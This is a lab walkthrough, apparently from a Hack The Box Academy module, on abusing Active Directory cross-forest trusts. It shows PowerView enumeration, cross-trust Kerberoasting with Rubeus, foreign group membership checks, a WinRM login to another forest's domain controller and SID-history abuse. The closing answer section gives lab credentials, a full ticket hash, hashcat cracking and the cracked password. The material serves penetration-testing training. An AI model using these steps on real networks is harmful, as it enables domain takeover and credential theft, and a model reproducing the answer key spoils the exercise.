# Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows

### Cross-Forest Kerberoasting

Kerberos attacks such as Kerberoasting and ASREPRoasting can be performed across trusts, depending on the trust direction. In a situation where you are positioned in a domain with either an inbound or bidirectional domain/forest trust, you can likely perform various attacks to gain a foothold. Sometimes you cannot escalate privileges in your current domain, but instead can obtain a Kerberos ticket and crack a hash for an administrative user in another domain that has Domain/Enterprise Admin privileges in both domains.

We can utilize PowerView to enumerate accounts in a target domain that have SPNs associated with them.

**Enumerating Accounts for Associated SPNs Using Get-DomainUser**

Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows

```powershell-session
PS C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName

samaccountname
--------------
krbtgt
mssqlsvc
```

We see that there is one account with an SPN in the target domain. A quick check shows that this account is a member of the Domain Admins group in the target domain, so if we can Kerberoast it and crack the hash offline, we'd have full admin rights to the target domain.

**Enumerating the mssqlsvc Account**

Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows

```powershell-session
PS C:\htb> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof

samaccountname memberof
-------------- --------
mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
```

Let's perform a Kerberoasting attack across the trust using `Rubeus`. We run the tool as we did in the Kerberoasting section, but we include the `/domain:` flag and specify the target domain.

**Performing a Kerberoasting Attacking with Rubeus Using /domain Flag**

Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows

```powershell-session
PS C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : mssqlsvc
[*] Target Domain          : FREIGHTLOGISTICS.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL/DC=FREIGHTLOGISTICS,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=mssqlsvc)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1

[*] SamAccountName         : mssqlsvc
[*] DistinguishedName      : CN=mssqlsvc,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
[*] ServicePrincipalName   : MSSQLsvc/sql01.freightlogstics:1433
[*] PwdLastSet             : 3/24/2022 12:47:52 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@FREIGHTLOGISTICS.LOCAL*$<SNIP>
```

We could then run the hash through Hashcat. If it cracks, we've now quickly expanded our access to fully control two domains by leveraging a pretty standard attack and abusing the authentication direction and setup of the bidirectional forest trust.

***

### Admin Password Re-Use & Group Membership

From time to time, we'll run into a situation where there is a bidirectional forest trust managed by admins from the same company. If we can take over Domain A and obtain cleartext passwords or NT hashes for either the built-in Administrator account (or an account that is part of the Enterprise Admins or Domain Admins group in Domain A), and Domain B has a highly privileged account with the same name, then it is worth checking for password reuse across the two forests. I occasionally ran into issues where, for example, Domain A would have a user named `adm_bob.smith` in the Domain Admins group, and Domain B had a user named `bsmith_admin`. Sometimes, the user would be using the same password in the two domains, and owning Domain A instantly gave me full admin rights to Domain B.

We may also see users or admins from Domain A as members of a group in Domain B. Only `Domain Local Groups` allow security principals from outside its forest. We may see a Domain Admin or Enterprise Admin from Domain A as a member of the built-in Administrators group in Domain B in a bidirectional forest trust relationship. If we can take over this admin user in Domain A, we would gain full administrative access to Domain B based on group membership.

We can use the PowerView function [Get-DomainForeignGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainForeignGroupMember) to enumerate groups with users that do not belong to the domain, also known as `foreign group membership`. Let's try this against the `FREIGHTLOGISTICS.LOCAL` domain with which we have an external bidirectional forest trust.

**Using Get-DomainForeignGroupMember**

Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows

```powershell-session
PS C:\htb> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL

GroupDomain             : FREIGHTLOGISTICS.LOCAL
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
MemberDomain            : FREIGHTLOGISTICS.LOCAL
MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS
                          TICS,DC=LOCAL

PS C:\htb> Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500

INLANEFREIGHT\administrator
```

The above command output shows that the built-in Administrators group in `FREIGHTLOGISTICS.LOCAL` has the built-in Administrator account for the `INLANEFREIGHT.LOCAL` domain as a member. We can verify this access using the `Enter-PSSession` cmdlet to connect over WinRM.

**Accessing DC03 Using Enter-PSSession**

Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows

```powershell-session
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator

[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> whoami
inlanefreight\administrator

[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : ACADEMY-EA-DC03
   Primary Dns Suffix  . . . . . . . : FREIGHTLOGISTICS.LOCAL
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : FREIGHTLOGISTICS.LOCAL
```

From the command output above, we can see that we successfully authenticated to the Domain Controller in the `FREIGHTLOGISTICS.LOCAL` domain using the Administrator account from the `INLANEFREIGHT.LOCAL` domain across the bidirectional forest trust. This can be a quick win after taking control of a domain and is always worth checking for if a bidirectional forest trust situation is present during an assessment and the second forest is in-scope.

***

### SID History Abuse - Cross Forest

SID History can also be abused across a forest trust. If a user is migrated from one forest to another and SID Filtering is not enabled, it becomes possible to add a SID from the other forest, and this SID will be added to the user's token when authenticating across the trust. If the SID of an account with administrative privileges in Forest A is added to the SID history attribute of an account in Forest B, assuming they can authenticate across the forest, then this account will have administrative privileges when accessing resources in the partner forest. In the below diagram, we can see an example of the `jjones` user being migrated from the `INLANEFREIGHT.LOCAL` domain to the `CORP.LOCAL` domain in a different forest. If SID filtering is not enabled when this migration is made and the user has administrative privileges (or any type of interesting rights such as ACE entries, access to shares, etc.) in the `INLANEFREIGHT.LOCAL` domain, then they will retain their administrative rights/access in `INLANEFREIGHT.LOCAL` while being a member of the new domain, `CORP.LOCAL` in the second forest.

![image](https://academy.hackthebox.com/storage/modules/143/sid-history.png)

This attack will be covered in-depth in a later module focusing more heavily on attacking AD trusts.

***

### Onwards

Next, we'll walk through some examples of attacking across a forest trust from a Linux attack host.

### **Questions**

Perform a cross-forest Kerberoast attack and obtain the TGS for the mssqlsvc user. Crack the ticket and submit the account's cleartext password as your answer.

```bash
xfreerdp /v:10.129.228.85 /u:htb-student /p:'Academy_student_AD!' /dynamic-resolution
```

then open an admin powershell

```powershell
 cd C:\Tools\
 Import-Module .\PowerView.ps1
 Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Enumerating the mssqlsvc Account

```powershell
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
```

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

Performing a Kerberoasting Attacking with Rubeus Using /domain Flag

```powershell
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@FREIGHTLOGISTICS.LOCAL*$9E25675CF85DC89D4BB525D523D2110B$721BEB74A53E0604E540A1608B9BE15E97D7815E9B5CAD28C66481E2A38FD4AE11C94C6913C45EC6F1A1E2BCBC134D285EB821B915907FAABE24EBAA53D8B599D79C22182F7D069891E266F463C1B5232430612AE9C98EBA83426BE5D8A684628FEB64379680E631A08D4ACF3E63413AA4513FE32CF750EA08AE528B3943B93B3658FAB4E7EB8F45F72518F35EDBFECC46232C56AA2814DE6CC99DA773DF4EF338E09118FD71BB57F76BC8ECA48F221B9AD4AC8E9C13068F5AD3C43AD2B11405C34AD478A9CB27916F6AFC9496E2EE2085E739D1537B3A7257DCD071470D2AE1C029660C6E01FBBCC49373FE512C7BE3B069A80BEC65DB2244BA2AD580037CE45100E978652DAAA52F8B32106494D36995FAE63D8720E3D4937461A223713A2ED021BCCC21C6EAFD1EEF646149EDECBF5789F73B062CAD4D01A5BAB0483E6ADA710FF27C475692E2ED65C9DBC884CC4116D6FA636DBF18E4424E1D0A404EC08CCA3F54BFD2805F3D1D218D2459B53C655A8E404B82CF6AA2799907FF963FE59D891BBED44806230EAFD8CF75A4BE6CCD541C4963A277EDF0A2F07975928D990BD88F5318CF8C7C0D64017C99E7D815A4540C3F25D1A70FD5B76C2C3074F7F6409607F2D2D00DCA38872E669A86601A70CA518BD900B323CFE91885CC0704C0831CDB375EF2509044A7D4401C40FFECB538D32AD4F1DEE78DAB6304D73981B66F9384239F1FC308CAB69B4C234DDD16654D2AD311D1AAEFCADC3EB6967045246FD49D52B3479F2B990B1713119F4CE5B43B63435743E7EF54C8B2171BCFB0E59F88AE43764C58EB25EA7F3E900C014B659FD493947609B61DBB18A46F25D0D287A7DFC264F461A572C894782A5067A1BCAB2644981B7C42304D4F3AEB4AC7CF9AE08FF83A84C43911AF37763A18A779F74100D677B765340AE874E46657B641FC4E17DE8CDCC6A2AF20DF9C5864F0D4FFC488004BEA5CC4871B5B3A79112502C4DB9F51851004F9A351BBA9D6B9B2DCB39F4C7588C473D283411A069EFA1B783DD32FBA320CE02B596C574BB8ABC9CBE942C6146273654FA191BDC51791FD1C5F8A8C501D5C39329F4A97622F756F848BFA89801EB8366B7F0A9B81C940B7A614B160F35E8288187B817BF79763387A39BAD2588249922FD3DE1ABC1203161DED563E995CD2CAE53DAECC2E8CD6C8619F1000091B9908B73BADE896E46E54EEF4E86EFA2F054D7BB9CE5DC15108E195E0FCB150595264C807094DB4E03652A8DAD08786FC3E00E249A6E5CF920AEFFD03774EE93E2273565DA7CF150AE7AD5F50E1E00CC8BFB73D3A172927AC4C15CC7226D7C8967AA9123E1C7314D2F8663340F592061484626AE671E729F2D6716D79727997AF3BA4AAB281311C6A018694448F36D67D0F8FF69B08D5770D107BBEC0330A2CB63D05779A391109866A4426BD79E90BB5A82BC825B6B0819A7F9104672307768B646B99A6C1848B11FFB54FF6BDEFF7E08123E38E101B10F7377F0ED648A206B8DBAABB5F3C5538B0F1DA6A2CFD65472AD26106E793476A2AA19BAF258128C7977883662269693DDB7FC7011F61E268CF20EF6EDFC3518913C6C8E14F95EDF06C27D84B8D8FA71FDF8365F5B0565AA4C8C41E22ED7D6904D53D134AC481936CD3D9313EDB1E
```

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

create text file with the hash and crack it with hashcat

```bash
hashcat hash.txt /usr/share/wordlists/rockyou.txt
#$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@FREIGHTLOGISTICS.LOCAL*$9e25675cf85dc89d4bb525d523d2110b$721beb74a53e0604e540a1608b9be15e97d7815e9b5cad28c66481e2a38fd4ae11c94c6913c45ec6f1a1e2bcbc134d285eb821b915907faabe24ebaa53d8b599d79c22182f7d069891e266f463c1b5232430612ae9c98eba83426be5d8a684628feb64379680e631a08d4acf3e63413aa4513fe32cf750ea08ae528b3943b93b3658fab4e7eb8f45f72518f35edbfecc46232c56aa2814de6cc99da773df4ef338e09118fd71bb57f76bc8eca48f221b9ad4ac8e9c13068f5ad3c43ad2b11405c34ad478a9cb27916f6afc9496e2ee2085e739d1537b3a7257dcd071470d2ae1c029660c6e01fbbcc49373fe512c7be3b069a80bec65db2244ba2ad580037ce45100e978652daaa52f8b32106494d36995fae63d8720e3d4937461a223713a2ed021bccc21c6eafd1eef646149edecbf5789f73b062cad4d01a5bab0483e6ada710ff27c475692e2ed65c9dbc884cc4116d6fa636dbf18e4424e1d0a404ec08cca3f54bfd2805f3d1d218d2459b53c655a8e404b82cf6aa2799907ff963fe59d891bbed44806230eafd8cf75a4be6ccd541c4963a277edf0a2f07975928d990bd88f5318cf8c7c0d64017c99e7d815a4540c3f25d1a70fd5b76c2c3074f7f6409607f2d2d00dca38872e669a86601a70ca518bd900b323cfe91885cc0704c0831cdb375ef2509044a7d4401c40ffecb538d32ad4f1dee78dab6304d73981b66f9384239f1fc308cab69b4c234ddd16654d2ad311d1aaefcadc3eb6967045246fd49d52b3479f2b990b1713119f4ce5b43b63435743e7ef54c8b2171bcfb0e59f88ae43764c58eb25ea7f3e900c014b659fd493947609b61dbb18a46f25d0d287a7dfc264f461a572c894782a5067a1bcab2644981b7c42304d4f3aeb4ac7cf9ae08ff83a84c43911af37763a18a779f74100d677b765340ae874e46657b641fc4e17de8cdcc6a2af20df9c5864f0d4ffc488004bea5cc4871b5b3a79112502c4db9f51851004f9a351bba9d6b9b2dcb39f4c7588c473d283411a069efa1b783dd32fba320ce02b596c574bb8abc9cbe942c6146273654fa191bdc51791fd1c5f8a8c501d5c39329f4a97622f756f848bfa89801eb8366b7f0a9b81c940b7a614b160f35e8288187b817bf79763387a39bad2588249922fd3de1abc1203161ded563e995cd2cae53daecc2e8cd6c8619f1000091b9908b73bade896e46e54eef4e86efa2f054d7bb9ce5dc15108e195e0fcb150595264c807094db4e03652a8dad08786fc3e00e249a6e5cf920aeffd03774ee93e2273565da7cf150ae7ad5f50e1e00cc8bfb73d3a172927ac4c15cc7226d7c8967aa9123e1c7314d2f8663340f592061484626ae671e729f2d6716d79727997af3ba4aab281311c6a018694448f36d67d0f8ff69b08d5770d107bbec0330a2cb63d05779a391109866a4426bd79e90bb5a82bc825b6b0819a7f9104672307768b646b99a6c1848b11ffb54ff6bdeff7e08123e38e101b10f7377f0ed648a206b8dbaabb5f3c5538b0f1da6a2cfd65472ad26106e793476a2aa19baf258128c7977883662269693ddb7fc7011f61e268cf20ef6edfc3518913c6c8e14f95edf06c27d84b8d8fa71fdf8365f5b0565aa4c8c41e22ed7d6904d53d134ac481936cd3d9313edb1e:1logistics
```

1logistics
